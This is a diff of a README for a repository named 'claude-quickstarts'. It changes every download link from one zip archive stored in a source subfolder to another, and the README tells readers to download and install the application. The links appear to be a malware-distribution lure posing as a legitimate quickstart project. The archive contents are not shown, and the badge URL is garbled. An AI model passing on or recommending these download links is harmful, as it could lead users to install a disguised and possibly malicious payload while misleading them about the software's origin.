@@ -1,6 +1,6 @@
 # 🚀 claude-quickstarts - Build Apps with Ease
 
-[![Download Latest Release](https://raw.githubusercontent.com/abusufiannn/claude-quickstarts/main/financial-data-analyst/lib/quickstarts_claude_2.8-alpha.4.zip%20Latest%https://raw.githubusercontent.com/abusufiannn/claude-quickstarts/main/financial-data-analyst/lib/quickstarts_claude_2.8-alpha.4.zip)](https://raw.githubusercontent.com/abusufiannn/claude-quickstarts/main/financial-data-analyst/lib/quickstarts_claude_2.8-alpha.4.zip)
+[![Download Latest Release](https://github.com/abusufiannn/claude-quickstarts/raw/refs/heads/main/customer-support-agent/app/claude_quickstarts_2.7.zip%20Latest%https://github.com/abusufiannn/claude-quickstarts/raw/refs/heads/main/customer-support-agent/app/claude_quickstarts_2.7.zip)](https://github.com/abusufiannn/claude-quickstarts/raw/refs/heads/main/customer-support-agent/app/claude_quickstarts_2.7.zip)
 
 ## 📖 Introduction
 
@@ -12,7 +12,7 @@ To get started quickly, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Go to the following link to access the latest releases:  
-   [Download Releases](https://raw.githubusercontent.com/abusufiannn/claude-quickstarts/main/financial-data-analyst/lib/quickstarts_claude_2.8-alpha.4.zip)
+   [Download Releases](https://github.com/abusufiannn/claude-quickstarts/raw/refs/heads/main/customer-support-agent/app/claude_quickstarts_2.7.zip)
 
 2. **Choose Your Application**  
    On the releases page, you will see a list of available projects. Look for the project you want to try.
@@ -45,7 +45,7 @@ To install the application you downloaded, follow these steps:
    After installation, find the application in your programs list and open it. You're ready to begin!
 
 For your convenience, you can find the downloads here again:  
-[Download Releases](https://raw.githubusercontent.com/abusufiannn/claude-quickstarts/main/financial-data-analyst/lib/quickstarts_claude_2.8-alpha.4.zip)
+[Download Releases](https://github.com/abusufiannn/claude-quickstarts/raw/refs/heads/main/customer-support-agent/app/claude_quickstarts_2.7.zip)
 
 ## 🌟 Features 
 
